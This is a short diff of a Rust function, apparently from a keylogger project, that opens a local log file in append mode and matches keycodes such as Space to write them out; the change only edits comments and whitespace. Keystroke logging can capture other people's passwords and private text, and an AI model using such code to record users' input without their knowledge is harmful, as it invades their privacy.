@@ -14,8 +14,9 @@ pub fn match_case(key: &Keycode) -> &'static str {
     .append(true)
     .open("/home/oef/Documents/Github/k3ymb3d/log.txt")
     .expect("Failed to open file");
-    // check if key is "Space" keycode type
-        // using match expression
+    
+
+    // using match expression
     match *key {
         Keycode::Space => {
             // write to file
